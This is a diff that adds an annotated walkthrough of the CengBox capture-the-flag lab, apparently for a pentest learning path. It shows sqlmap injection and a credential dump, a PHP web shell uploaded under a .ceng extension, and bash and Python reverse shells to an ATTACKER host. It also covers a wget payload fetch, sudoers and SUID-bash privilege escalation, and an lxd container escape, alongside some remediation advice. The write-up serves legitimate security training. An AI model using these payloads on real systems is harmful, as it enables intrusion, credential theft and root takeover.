@@ -234,4 +234,425 @@ filter, and of a plaintext password column.
 
 ---
 
+## The commands, annotated — every input and every output
+
+Published walkthroughs use `192.168.56.106` for the target and `192.168.56.10` for Kali.
+
+### 1. Scan
+
+```bash
+sudo nmap -A -p- -T4 -oN scans/cengbox.txt TARGET
+```
+
+```text
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: CengBox
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+OS details: Linux 4.15 - 5.5
+```
+
+`-A` is shorthand for `-sV -sC -O --traceroute` — versions, default scripts, OS detection and
+route, all at once. `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3` plus `Apache 2.4.29 ((Ubuntu))` pins
+**Ubuntu 18.04**. Two ports, so the whole attack is in the web application.
+
+### 2. Content discovery — and why the small list fails
+
+```bash
+curl -s http://TARGET/ | head -30
+curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/robots.txt
+dirb http://TARGET/ /usr/share/dirb/wordlists/common.txt
+```
+
+```text
+404
+```
+```text
+---- Scanning URL: http://192.168.56.106/ ----
+==> DIRECTORY: http://192.168.56.106/uploads/
+DOWNLOADED: 4612 - FOUND: 1
+```
+
+`robots.txt` returns **`404`** — nothing leaked. `-o /dev/null -w '%{http_code}'` prints only
+the status, which is the fast way to test for a file's existence without reading its body.
+dirb found one directory: `/uploads/`.
+
+**Stop and reason about that.** An `/uploads/` directory with no application to upload *from*
+means the picture is incomplete — something is hidden. Escalate the wordlist:
+
+```bash
+dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt
+```
+
+```text
+==> DIRECTORY: http://192.168.56.106/masteradmin/
+==> DIRECTORY: http://192.168.56.106/uploads/
+DOWNLOADED: 20469 - FOUND: 2
+```
+
+`common.txt` (4,612 entries) missed `/masteradmin`; `big.txt` (20,469) found it. **That is the
+lesson of phase one: `common.txt` is not enough.** The progression worth memorising is
+`dirb/common.txt` (4.6 k) → `dirb/big.txt` (20 k) → `directory-list-2.3-medium.txt` (220 k) →
+`SecLists/…/directory-list-2.3-big.txt` (1.3 M) → `raft-large-directories.txt`. Escalate
+before concluding a box is bare.
+
+### 3. Rescan the new directory *with extensions*
+
+```bash
+dirb http://TARGET/masteradmin/ /usr/share/dirb/wordlists/big.txt -X .php
+```
+
+```text
++ http://192.168.56.106/masteradmin/login.php (CODE:200|SIZE:1194)
++ http://192.168.56.106/masteradmin/adb.php (CODE:302|SIZE:0)
++ http://192.168.56.106/masteradmin/upload.php (CODE:302|SIZE:0)
+```
+
+`-X .php` **appends the extension to every wordlist entry** (equivalent to `gobuster -x php`).
+PHP applications hide their real surface behind `.php` files a plain directory scan never
+guesses. Read the three results: `login.php` at **`200` with a real size** is the injectable
+form; `upload.php` and `adb.php` at **`302` with `SIZE:0`** redirect because you are not
+authenticated — but their *existence* is now known, and `upload.php` is your eventual goal.
+
+### 4. Record the manual failures first
+
+| Username | Password | Result |
+| --- | --- | --- |
+| `admin` | `admin` | "Invalid credentials" |
+| `masteradmin` | `masteradmin` | "Invalid credentials" |
+| `' OR 1=1-- -` | `x` | "Invalid credentials" |
+
+Trying the obvious by hand takes a minute and tells you the form is not trivially bypassable,
+so the injection is subtler than `' OR 1=1--`. Note the message is the *same* for a bad
+username and a bad password — good practice, and the reason you need `sqlmap` rather than
+guessing.
+
+### 5. Let `sqlmap` find the injection
+
+```bash
+sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
+```
+
+```text
+[17:22:41] [INFO] testing connection to the target URL
+[17:22:41] [INFO] searching for forms
+[17:22:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:22:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[17:23:12] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
+[17:23:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[17:23:19] [INFO] target URL appears to be UNION injectable with 3 columns
+[17:23:19] [CRITICAL] parameter 'username' is vulnerable. Do you want to keep testing the others? [y/N] N
+sqlmap identified the following injection point(s):
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 1=1-- -&password=x
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND SLEEP(5)-- -&password=x
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x71706a7871,0x616263,0x71626b6271)-- -&password=x
+---
+[17:23:20] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04
+back-end DBMS: MySQL >= 5.0.12
+```
+
+Every flag is a decision:
+
+| Flag | Meaning |
+| --- | --- |
+| `--forms` | fetch the page, parse its `<form>`, and test every field — saves writing a raw request file |
+| `--batch` | never prompt; take the default answer. Essential for scripted runs |
+| `--level 3` | also test `User-Agent`, `Referer` and cookies (levels 4–5 add more HTTP headers) |
+| `--risk 2` | how *dangerous* payloads may be. **Risk 3 adds time-based and heavy `OR` tests that could alter data — get written permission before risk 3 on a client system** |
+
+Read the three identified techniques as three *proofs*, and note that all three were found on
+the **same parameter** (`username`) — when a tool reports three independent techniques on one
+field, the injection is real and deep. `CONCAT(0x71706a7871,…,0x71626b6271)` is sqlmap's
+**marker trick**: `0x71…` is hex for `qpjxq`, so it wraps its output in a unique string it can
+find again in the response — that is how UNION extraction works over a page whose layout you
+cannot predict.
+
+### 6. Dump the database
+
+```bash
+sqlmap -u "http://TARGET/masteradmin/login.php" --data="username=a&password=b" \
+       -p username --batch --dbs
+sqlmap -u "..." --data="username=a&password=b" -p username --batch -D cengbox --tables
+sqlmap -u "..." --data="username=a&password=b" -p username --batch -D cengbox -T users --dump
+```
+
+```text
+available databases [2]:
+[*] cengbox
+[*] information_schema
+```
+```text
+Database: cengbox
+[3 tables]
++---------+
+| uploads |
+| users   |
+| config  |
++---------+
+```
+```text
+Database: cengbox
+Table: users
+[1 entry]
++----+-------------+-----------------+
+| id | username    | password        |
++----+-------------+-----------------+
+| 1  | masteradmin | C3ng0v3R00T1!   |
++----+-------------+-----------------+
+```
+
+`--dbs` lists databases, `-D NAME --tables` lists tables, `-T NAME --dump` prints rows.
+`-p username` pins the parameter you already proved vulnerable so sqlmap stops re-testing
+everything else — a large time saving on repeat runs. `--data` supplies the POST body.
+
+**Read the schema, not just the rows.** `password` in a `varchar(64)` column with no `$2y$` or
+`$6$` prefix means the password is stored **in plaintext** — finding-grade, since anyone with
+injection, a backup, or read access to the schema gets every administrator instantly. The
+correct storage is `password_hash($pw, PASSWORD_ARGON2ID)` verified with `password_verify()`.
+And note the `uploads` table already holds two **`.ceng`** files: that extension is the hint
+for the next phase.
+
+Log in at `/masteradmin/login.php` as `masteradmin` / `C3ng0v3R00T1!`.
+
+### 7. The `.ceng` upload filter
+
+`upload.php` rejects anything that is not `.ceng`. **Understand the filter before bypassing
+it:** it checks the *extension string*. And this application **maps `.ceng` to the PHP
+handler** — which is what turns a "documents only" rule into remote code execution.
+
+```bash
+cat > shell.ceng <<'EOF'
+<?php system($_GET['cmd']); ?>
+EOF
+curl -s -b cookies.txt -F "file=@shell.ceng" http://TARGET/masteradmin/upload.php
+curl -s "http://TARGET/uploads/shell.ceng?cmd=id"
+```
+
+```text
+Upload successful
+```
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+`-F "file=@shell.ceng"` posts `multipart/form-data` with the field named `file`; the `@`
+means "read this path". `-b cookies.txt` replays your authenticated session, without which you
+get the `302` you saw in step 3. `uid=33(www-data)` is the expected landing: unprivileged but
+on the server.
+
+Every upload defence has a standard bypass — extension blacklist (`.phtml`, `.php5`, `.php7`,
+`.pht`, `.phar`, case tricks, `.php.jpg`, null byte on old PHP); MIME-type check (the header is
+**client-controlled and worthless** — change it in Burp); `getimagesize()` (prepend real image
+bytes to make a polyglot). Here none of that was needed, because the *custom extension was
+mapped to the interpreter*.
+
+### 8. Reverse shell and TTY upgrade
+
+```bash
+nc -lvnp 4444                                     # Kali, first
+curl -s "http://TARGET/uploads/shell.ceng?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
+```
+
+```text
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.56.106.
+www-data@cengbox:/var/www/html$
+```
+
+**URL-encoding is not optional here.** `&`, `>` and spaces are all meaningful or illegal in a
+query string, so sent raw the payload is truncated at the first `&` and nothing happens —
+which looks like a broken shell. Generate the encoding rather than typing `%26` by hand.
+
+Then upgrade: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `Ctrl+Z`, `stty raw -echo;
+fg`, `export TERM=xterm`. Without the TTY, `su` fails with `standard input must be a tty` and
+`Ctrl+C` kills your listener.
+
+```bash
+uname -a; hostname; cat /etc/os-release; pwd
+for b in bash sh python python3 perl nc curl wget gcc socat; do command -v $b; done
+```
+
+Enumerate what is available **before** committing to a payload — this box has no `nc`, which is
+why bash's `/dev/tcp` is the right choice.
+
+### 9. Lateral movement — credential reuse
+
+```bash
+cat /etc/passwd | grep -E ':(1000|1001):'
+su cengover
+id
+cat /home/cengover/user.txt
+```
+
+```text
+cengover:x:1000:1000:cengover,,,:/home/cengover:/bin/bash
+```
+```text
+uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),110(lxd)
+```
+
+Read `grep -E ':(1000|1001):'` as "find lines whose UID/GID fields are real users" — system
+accounts live below 1000. **The database password also works for the system account**:
+credential reuse across systems. Then read the `id` output closely — **`groups=…,110(lxd)`**.
+That group is equivalent to root, and it is your alternative escalation path.
+
+### 10. Privilege escalation — cron shows nothing
+
+```bash
+crontab -l; cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d/
+```
+
+```text
+no crontab for cengover
+```
+```text
+# /etc/crontab: system-wide crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+```
+
+All stock, nothing custom. The `/etc/crontab` fields are `min hour dom mon dow **user**
+command` — note the *user* column, which per-user crontabs lack; **that column is what makes a
+system cron job run as root.** Nothing here is exploitable.
+
+### 11. `pspy` — see what `ps` cannot
+
+`ps` and `/proc` only show what is running *right now*; a job firing every few seconds is easy
+to miss between looks. `pspy` needs no root — it watches `inotify` events on `/proc` and logs
+every process start and exit with the full command line and the UID that ran it.
+
+```bash
+wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
+```
+
+```text
+2024/05/04 19:02:11 CMD: UID=0     PID=1842   | /usr/bin/python /opt/md5check.py
+2024/05/04 19:02:16 CMD: UID=0     PID=1845   | /usr/bin/python /opt/md5check.py
+2024/05/04 19:02:21 CMD: UID=0     PID=1848   | /usr/bin/python /opt/md5check.py
+```
+
+Read each line as: **`UID=`** the effective user that started it (**0 = root**), **`PID=`** the
+process id, and everything after the last `|` the **full command line**. The repeating
+timestamps five seconds apart prove it is a timed job — and it is *not* in cron, so it is a
+systemd timer or a `while true; sleep 5` loop. pspy does not care how it is scheduled; it just
+reports that it runs.
+
+```bash
+ls -l /opt/md5check.py
+cat /opt/md5check.py
+```
+
+```text
+-rwxrwxrwx 1 root root 612 Oct 19 15:40 /opt/md5check.py
+```
+```python
+#!/usr/bin/python
+# Verify that /etc/passwd has not been tampered with.
+# Compares the current md5 against the stored baseline and restores it if changed.
+import hashlib, shutil
+h = hashlib.md5(open('/etc/passwd','rb').read()).hexdigest()
+if h != open('/opt/passwd.md5').read().strip():
+    shutil.copy('/opt/passwd.bak','/etc/passwd')
+```
+
+**`-rwxrwxrwx` — mode `777`.** A root-owned script, executed **by root** every five seconds,
+that **any user on the box can overwrite.** That is the entire privilege escalation. A
+scheduled job is safe only if (1) the script is not writable by lower-privileged users,
+(2) it never executes anything from a world-writable location, and (3) it uses absolute paths
+throughout. **Rule 1 is broken here** — and the irony is perfect: the script's job is to
+*detect tampering*, and it is itself the tampering vector.
+
+### 12. Three payloads, and which to choose
+
+**A — root reverse shell (most direct):**
+
+```bash
+cp /opt/md5check.py /tmp/md5check.py.bak        # ALWAYS keep a copy first
+cat > /opt/md5check.py <<'EOF'
+import socket, os, subprocess
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ATTACKER", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/bash", "-i"])
+EOF
+# wait five seconds
+```
+
+`os.dup2(fd, 0/1/2)` points **stdin, stdout and stderr** at the socket, then `subprocess.call`
+execs bash, which inherits them. Every reverse shell in every language is those three steps:
+**connect → redirect stdio → exec a shell.** Note `/usr/bin/python` here is **Python 2**, so
+this payload deliberately uses only syntax valid in both 2 and 3.
+
+**B — grant passwordless sudo (survives a dropped connection, needs no egress):**
+
+```bash
+echo 'cengover ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/cengover && chmod 440 /etc/sudoers.d/cengover
+sudo -i
+```
+
+Prefer a `/etc/sudoers.d/` drop-in to appending to `/etc/sudoers`: a syntax error in
+`/etc/sudoers` locks *everyone* out of sudo (which is why `visudo` exists — it validates before
+saving), whereas a bad drop-in affects only itself. `chmod 440` is required — sudo ignores
+files with loose permissions.
+
+**C — SUID root bash (persistence):**
+
+```bash
+cp /bin/bash /tmp/rb && chown root:root /tmp/rb && chmod 4755 /tmp/rb && /tmp/rb -p
+id
+```
+
+```text
+uid=1000(cengover) gid=1000(cengover) euid=0(root) egid=0(root) groups=1000(cengover),110(lxd)
+```
+
+`chmod 4755` — the leading **`4`** is the SUID bit, producing `-rwsr-xr-x root root`: whoever
+executes it runs with the *owner's* identity. **`-p` is mandatory**: bash deliberately drops
+its effective UID at startup unless invoked with `-p` ("privileged"), an explicit guard against
+exactly this attack. Forgetting `-p` and getting `$` instead of `#` is the classic confusion.
+Read the `id` output as a *SUID elevation, not a login*: real UID stays `1000(cengover)`,
+**effective** UID becomes `0`, and permission checks use the effective UID.
+
+```bash
+cat /root/root.txt
+cp /tmp/md5check.py.bak /opt/md5check.py && ls -l /opt/md5check.py    # restore afterwards
+```
+
+### 13. Alternative root — the `lxd` group
+
+```bash
+lxc image import ./alpine.tar.gz --alias privesc
+lxc init privesc escape -c security.privileged=true
+lxc config device add escape host disk source=/ path=/mnt/root recursive=true
+lxc start escape
+lxc exec escape -- /bin/sh
+cat /mnt/root/root/root.txt
+```
+
+**Every flag in that sequence is load-bearing.** `-c security.privileged=true` **disables the
+user namespace**, so container root *is* host root. `disk source=/ path=/mnt/root
+recursive=true` **bind-mounts the host's entire `/`** into the container, including submounts.
+`lxc exec … -- /bin/sh` gives you a shell inside, looking at the real host filesystem. Clean up
+with `lxc stop escape && lxc delete escape && lxc image delete privesc`.
+
+**Treat `lxd` and `docker` group membership as root — because it is.** Detect it with
+`getent group docker lxd`; remediate with rootless LXD or rootless Docker/Podman.
+
+---
+
 _Back to [Learning Path 1](../README.md) · previous: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · next: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · full writeup: [`labs/3-018-cengbox-1`](../../labs/3-018-cengbox-1/README.md)._
